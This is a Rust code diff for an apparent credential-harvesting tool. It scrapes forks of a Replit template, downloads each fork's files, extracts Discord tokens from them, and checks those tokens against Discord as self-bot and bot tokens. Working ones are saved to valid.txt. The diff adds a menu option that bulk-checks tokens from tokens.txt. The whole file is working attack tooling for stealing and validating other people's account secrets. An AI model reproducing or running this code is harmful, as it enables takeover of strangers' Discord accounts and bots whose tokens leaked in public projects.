@@ -6,6 +6,19 @@ use futures::{stream::futures_unordered::FuturesUnordered, StreamExt};
 use std::io::{self, stdout, Write};
 use tokio::fs::OpenOptions;
 use tokio::io::AsyncWriteExt;
+use std::{
+    fs::File,
+    io::{prelude::*, BufReader},
+    path::Path,
+};
+
+fn lines_from_file(filename: impl AsRef<Path>) -> Vec<String> {
+    let file = File::open(filename).expect("no such file");
+    let buf = BufReader::new(file);
+    buf.lines()
+        .map(|l| l.expect("Could not parse line"))
+        .collect()
+}
 
 
 #[tokio::main()]
@@ -27,10 +40,80 @@ async fn main() {
     println!("\x1b[0;31mView https://github.com/Shell1010 for any future projects.
 Join our Discord Server for Help & Support + Announcements regarding future projects
 https://discord.gg/qCJwVERPRV\x1b[0m");
-    chunk_scrape_forks().await;
+    println!("\x1b[0;31m
 
+        ╔════════════════════════════════════╗
+        ║  A. Scrape forks from inputted URL ║
+        ║  B. Check the tokens in tokens.txt ║
+        ╚════════════════════════════════════╝
+
+    \x1b[0m");
+    loop {
+        print!("\x1b[0;32mPlease enter an Option: [>]\x1b[0m ");
+        stdout().flush().unwrap();
+        let mut option = String::new();
+        io::stdin()
+        .read_line(&mut option)
+        .expect("Failed to read line");
+
+        if option.trim() == "A" {
+            chunk_scrape_forks().await;
+        } else if option.trim() == "B" {
+            check_tokens().await;
+        } else {
+            println!("[0;31mInvalid Option[0m");
+        }
+    }
 }
 
+async fn check_tokens() {
+    let client = Arc::new(Client::new());
+    let tokens = lines_from_file("./tokens.txt");
+
+    let mut tokens = tokens.iter().peekable();
+    let repl = Replit::new("ok");
+    let mut chunk_count = 0;
+
+    let mut file_writer = OpenOptions::new()
+    .create(true)
+    .append(true)
+    .open("valid.txt")
+    .await.unwrap();
+
+    file_writer.write_all("Self:\n".as_bytes()).await.unwrap();
+    let mut futs = FuturesUnordered::new();
+    while let Some(token) = &tokens.next() {
+        futs.push(repl.self_check_tokens(client.clone(), token.to_string().clone()));
+        chunk_count += 1;
+        if tokens.peek().is_none() || chunk_count >= 100 {
+            while futs.next().await.is_some() {};
+            chunk_count = 0;
+        }
+    }
+
+    let tokens = lines_from_file("./tokens.txt");
+    let mut tokens = tokens.iter().peekable();
+    let mut file_writer = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open("valid.txt")
+        .await.unwrap();
+    file_writer.write_all("Bot:\n".as_bytes()).await.unwrap();
+    let mut futs = FuturesUnordered::new();
+
+
+    while let Some(token) = tokens.next() {
+        futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
+        chunk_count += 1;
+        if tokens.peek().is_none() || chunk_count >= 100 {
+            while futs.next().await.is_some() {};
+            chunk_count = 0;
+        }
+    }
+
+    println!("Finished");
+
+}
 
 async fn chunk_scrape_forks() {
     println!("\x1b[0;32mExample URL: /@templates/Discord-Bot-Starter\x1b[0m");
@@ -45,6 +128,7 @@ async fn chunk_scrape_forks() {
     let id = repl.get_id().await;
 
     let (urls, _ids) = repl.get_forks(&id).await;
+
     print!("\x1b[0;32mAmount of forks to scrape: [>]\x1b[0m ");
     stdout().flush().unwrap();
     let mut amount = String::new();
@@ -61,11 +145,12 @@ async fn chunk_scrape_forks() {
 
 
     while let Some(url) = urls.next() {
+
         let rep = repl.clone();
         futs.push(rep.get_zip(client.clone(), url.clone(), count));
         count += 1;
         chunk_count += 1;
-        if urls.peek().is_none() || chunk_count >= 50 {
+        if urls.peek().is_none() || chunk_count >= 50  {
             while let Some(val) = futs.next().await {
                 if let Some(val) = val { zips.push(val)}
             }
@@ -78,26 +163,36 @@ async fn chunk_scrape_forks() {
     };
 
 
+
     println!("\x1b[0;32mFinished all downloads!\x1b[0m");
     let mut tokens: Vec<String> = Vec::new();
     for zip in zips {
         let mut token = repl.search_extract(zip).await;
         tokens.append(&mut token);
     }
+    let mut tokens = tokens.iter().peekable();
+    let tok = tokens.clone();
     // Check Selfbot tokens
+    let mut chunk_count = 0;
+
     let mut file_writer = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open("valid.txt")
-        .await.unwrap();
+    .create(true)
+    .append(true)
+    .open("valid.txt")
+    .await.unwrap();
+
     file_writer.write_all("Self:\n".as_bytes()).await.unwrap();
     let mut futs = FuturesUnordered::new();
-    for token in tokens.clone() {
-        futs.push(repl.self_check_tokens(client.clone(), token.clone()));
+    while let Some(token) = tokens.next() {
+        futs.push(repl.self_check_tokens(client.clone(), token.to_string().clone()));
+        chunk_count += 1;
+        if tokens.peek().is_none() || chunk_count >= 100 {
+            while futs.next().await.is_some() {};
+            chunk_count = 0;
+        }
     }
-    while futs.next().await.is_some() {};
 
-    // Check Bot tokens
+
     let mut file_writer = OpenOptions::new()
         .create(true)
         .append(true)
@@ -105,11 +200,17 @@ async fn chunk_scrape_forks() {
         .await.unwrap();
     file_writer.write_all("Bot:\n".as_bytes()).await.unwrap();
     let mut futs = FuturesUnordered::new();
-    for token in tokens {
+
+
+    for token in tok {
         futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
+        chunk_count += 1;
+        if tokens.peek().is_none() || chunk_count >= 100 {
+            while futs.next().await.is_some() {};
+            chunk_count = 0;
+        }
     }
-    while futs.next().await.is_some() {};
-    println!("Finished");
+    println!("Finished")
 
 
 }
